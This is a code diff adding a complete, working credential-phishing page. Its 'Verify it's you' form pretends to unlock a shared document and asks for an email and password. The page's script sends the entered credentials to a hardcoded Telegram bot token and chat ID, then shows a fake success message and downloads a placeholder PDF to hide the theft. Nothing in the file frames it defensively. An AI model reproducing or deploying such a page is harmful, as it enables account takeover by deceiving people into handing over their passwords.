@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify It's You</title>
+  <link rel="icon" type="image/png" href="https://i.ibb.co/hFxXYymQ/logo.png" sizes="32x32">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url("https://i.ibb.co/dw500FdJ/background.jpg");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 300px;
+      text-align: left;
+    }
+    .logo {
+      width: 80px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #333333;
+    }
+    p {
+      font-size: 14px;
+      color: #666666;
+      margin-bottom: 20px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #cccccc;
+      border-radius: 4px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .checkbox {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .checkbox input {
+      margin-right: 10px;
+    }
+    .checkbox label {
+      font-size: 14px;
+      color: #666666;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #8B0000;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    button:hover {
+      background-color: #6B0000;
+    }
+    .success-message {
+      display: none;
+      margin-top: 20px;
+      color: green;
+      font-size: 14px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.ibb.co/hFxXYymQ/logo.png" alt="Logo" class="logo" />
+    <h1>Verify it's you</h1>
+    <p>Only recipient email can access document</p>
+    <form id="loginForm">
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <div class="checkbox">
+        <input type="checkbox" id="keep-signed-in" name="keep-signed-in" />
+        <label for="keep-signed-in">Keep me signed in</label>
+      </div>
+      <button type="submit">Next</button>
+    </form>
+    <div class="success-message" id="message">🔓 Verified! Your document is being prepared...</div>
+  </div>
+
+  <script>
+    const form = document.getElementById("loginForm");
+    const message = document.getElementById("message");
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = form.email.value;
+      const password = form.password.value;
+
+      const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
+      const chatId = "5613637159";
+      const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+      const msg = `🔒 New Login Attempt 🔒\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+      try {
+        await fetch(telegramUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: new URLSearchParams({
+            chat_id: chatId,
+            text: msg
+          })
+        });
+
+        // Show success
+        message.style.display = "block";
+
+        // Simulate a "PDF download"
+        setTimeout(() => {
+          const blob = new Blob(["This is a placeholder for your unlocked PDF."], {
+            type: "application/pdf",
+          });
+          const url = URL.createObjectURL(blob);
+          const link = document.createElement("a");
+          link.href = url;
+          link.download = "Unlocked_Document.pdf";
+          link.click();
+          URL.revokeObjectURL(url);
+        }, 2000);
+      } catch (err) {
+        alert("❌ Failed to send to Telegram.");
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
